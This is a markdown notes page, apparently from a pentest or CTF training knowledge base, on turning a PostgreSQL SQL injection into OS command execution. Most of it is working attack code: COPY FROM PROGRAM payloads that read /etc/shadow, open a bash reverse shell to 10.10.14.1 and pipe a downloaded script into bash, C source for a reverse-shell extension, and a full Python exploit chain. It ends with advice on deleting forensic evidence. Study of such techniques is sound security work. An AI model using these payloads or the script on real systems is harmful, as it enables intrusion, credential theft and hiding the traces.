---
tags: [attack/web, attack]
module: advanced_sql_injections
last_updated: 2026-05-22
source_count: 1
---

# PostgreSQL RCE via SQLi

Two methods for achieving OS-level command execution through a PostgreSQL SQL injection. Both run commands as the `postgres` OS user.

## Permissions Required

| Method | Required privilege |
|--------|-------------------|
| COPY FROM PROGRAM | Superuser OR `pg_execute_server_program` role |
| Custom C extension | Superuser OR `CREATE` privilege on the schema; `C` language must be trusted |

```sql
-- Check current privilege level
SELECT current_setting('is_superuser');   -- 'on' = superuser
SELECT current_user;
```

---

## Method 1: COPY FROM PROGRAM (CVE-2019-9193)

`COPY FROM PROGRAM` executes a shell command and stores the output in a table. The PostgreSQL team considers this intended functionality — CVE-2019-9193 was assigned but officially disputed.

```sql
-- Execute id and capture output
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'id';
SELECT * FROM tmp;
DROP TABLE tmp;

-- Example output:
-- uid=119(postgres) gid=124(postgres) groups=124(postgres),118(ssl-cert)
```

### Command Execution Examples

```sql
-- Read /etc/shadow
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'cat /etc/shadow';
SELECT STRING_AGG(t, E'\n') FROM tmp;
DROP TABLE tmp;

-- Reverse shell (start a listener first: nc -nvlp 4444)
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1"';
DROP TABLE tmp;

-- Download and execute
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'curl http://10.10.14.1/shell.sh | bash';
DROP TABLE tmp;
```

### Injecting via SQLi

For injection points that support stacked queries:

```
'; CREATE TABLE tmp(t TEXT); COPY tmp FROM PROGRAM 'id'; --
```

Then read the output:

```
' UNION SELECT STRING_AGG(t,','),'2','3','4',5 FROM tmp--
```

---

## Method 2: Custom PostgreSQL Extension (C Reverse Shell)

A more complex technique that involves compiling a C shared library, uploading it to the server (via Large Objects — see [[attack/web/postgresql_file_read_write]]), and loading it as a PostgreSQL extension.

### The C Extension Source

```c
// pg_rev_shell.c — reverse shell as a PostgreSQL extension
// Compile: gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_rev_shell.so pg_rev_shell.c

#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include "postgres.h"
#include "fmgr.h"
#include "utils/builtins.h"

PG_MODULE_MAGIC;
PG_FUNCTION_INFO_V1(rev_shell);

Datum rev_shell(PG_FUNCTION_ARGS) {
    char *LHOST = text_to_cstring(PG_GETARG_TEXT_PP(0));
    int32 LPORT = PG_GETARG_INT32(1);

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(LPORT);
    inet_pton(AF_INET, LHOST, &serv_addr.sin_addr);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));

    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
    PG_RETURN_INT32(0);
}
```

### Compilation

The `.so` must be compiled for the **exact PostgreSQL major version** running on the target due to `PG_MODULE_MAGIC`.

```bash
# Install dev headers for the target PostgreSQL version
sudo apt install postgresql-server-dev-13 -y

# Compile
gcc -I$(pg_config --includedir-server) -shared -fPIC \
    -o pg_rev_shell.so pg_rev_shell.c

# Verify it was compiled for the right version
strings pg_rev_shell.so | grep -i magic
```

### Upload and Execute

```bash
# Step 1: Upload pg_rev_shell.so to /tmp/ on the target
# Use Large Objects method (see postgresql_file_read_write.md)
# or COPY TO if you can write a file and it's accessible

# Step 2: Start listener
nc -nvlp 443

# Step 3: Load the extension and call the function
psql -h target -U bbuser bluebird
```

```sql
-- Load function from uploaded .so (note: no .so extension in path)
CREATE FUNCTION rev_shell(text, integer) RETURNS integer
  AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;

-- Trigger the reverse shell (LHOST = attacker IP)
SELECT rev_shell('10.10.14.1', 443);
-- Session hangs — check listener for incoming shell

-- Cleanup after use
DROP FUNCTION rev_shell;
```

---

## Automated Exploit Script

The script below automates the entire chain: upload via Large Objects → export to `/tmp/` → load → trigger.

```python
#!/usr/bin/env python3
import requests, random, string, math
from urllib.parse import quote_plus

LHOST = "10.10.14.1"
LPORT = 443
TARGET = "http://target:8080"

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def sqli(query):
    """
    TODO: implement the specific injection for the target.
    For BlueBird /forgot with stacked queries:
    """
    payload = f"'; {query}--@bluebird.htb"
    requests.post(f"{TARGET}/forgot",
        headers={"X-Forwarded-For": "127.0.1.1"},
        data={"email": payload})

# Read compiled extension
with open("pg_rev_shell.so", "rb") as f:
    raw = f.read()

# Upload via large objects
loid = random.randint(50000, 60000)
sqli(f"SELECT lo_create({loid})")
print(f"[*] Created large object: {loid}")

for pageno in range(math.ceil(len(raw) / 2048)):
    page = raw[pageno * 2048 : (pageno + 1) * 2048]
    sqli(f"INSERT INTO pg_largeobject (loid, pageno, data) "
         f"VALUES ({loid}, {pageno}, decode('{page.hex()}', 'hex'))")
    print(f"[*] Uploaded page {pageno} ({len(page)} bytes)")

# Export, load function, trigger, cleanup
chain  = f"SELECT lo_export({loid}, '/tmp/pg_rev_shell.so');"
chain += f"SELECT lo_unlink({loid});"
chain +=  "DROP FUNCTION IF EXISTS rev_shell;"
chain +=  "CREATE FUNCTION rev_shell(text, integer) RETURNS integer " \
          "AS '/tmp/pg_rev_shell', 'rev_shell' LANGUAGE C STRICT;"
chain += f"SELECT rev_shell('{LHOST}', {LPORT});"

print(f"[*] Triggering reverse shell (LHOST={LHOST}, LPORT={LPORT})")
sqli(chain)
```

---

## Cleanup

```sql
-- Remove the function
DROP FUNCTION rev_shell;

-- Remove any lingering large objects
SELECT lo_unlink(loid) FROM pg_largeobject_metadata;

-- Remove the shared library from disk (via another COPY FROM PROGRAM)
CREATE TABLE tmp(t TEXT);
COPY tmp FROM PROGRAM 'rm /tmp/pg_rev_shell.so';
DROP TABLE tmp;
```

---

## Gotchas & Notes

- **COPY FROM PROGRAM** is the simpler path — prefer it over extensions when `pg_execute_server_program` is granted.
- The extension `.so` is version-locked. Check `SELECT version()` before compiling — compiling for PostgreSQL 14 and running on 13 will fail with `incompatible library version`.
- The `SELECT rev_shell(...)` call will hang the database session while the reverse shell is active. The `psql` prompt will not return until you exit the shell.
- After exploiting, `postgres` OS user access may allow privilege escalation if the postgres user has `sudo` rights or SUID binaries are accessible.
- Always clean up extensions, large objects, and `/tmp/` files — they persist across sessions and leave forensic evidence.

## Related Pages

- [[attack/web/postgresql_file_read_write]] — uploading the `.so` via Large Objects
- [[attack/web/advanced_sqli_character_bypasses]] — injecting these queries through character-filtered endpoints
- [[attack/web/error_based_sqli]] — alternative for read-only exfiltration
- [[attack/web/sqli_prevention]] — parameterized queries and least-privilege fixes
- [[tools/utility/psql]] — testing commands directly before scripting

## Sources

- raw/advanced_sql_injections/postgresql_specific_techniques_common_execution.md
